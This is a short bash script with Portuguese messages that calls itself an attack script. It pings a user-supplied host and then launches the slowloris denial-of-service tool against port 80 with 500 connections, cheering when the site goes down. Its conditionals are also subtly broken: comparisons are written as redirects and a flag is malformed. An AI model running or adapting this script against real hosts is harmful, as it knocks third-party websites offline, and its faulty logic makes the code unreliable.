#!/bin/bash
echo "Script de ataque com o monitoramento com o ping."
echo
echo " Digite o dns ou ip:"
read DNS

echo " Testando o Ping"

PIN=$(ping $DNS -c 20 | grep loss | awk '{ print $6 }')

echo $PIN

echo "Ping OK!!"

echo "começando a fazer o mal  +_+ +_+ +_+"

LO=$(/home/kadimo/Downloads/slowloris.pl -dns $DNS -port 80 -timeout 2000 -num 500 tcpto 5)

if [ $PIN > 30 ];then
        echo "continue o ataque"
        echo perl $LO
fi

if [ $PIN >= 70 ];then
        echo " ataque total"
        echo perl $LO
fi

if [ $PIN = 100 ];then
        echo " Site Caiuuuuuuuuuuuuuuuuuuuuuuuu"
fi

sleep 5 

exit
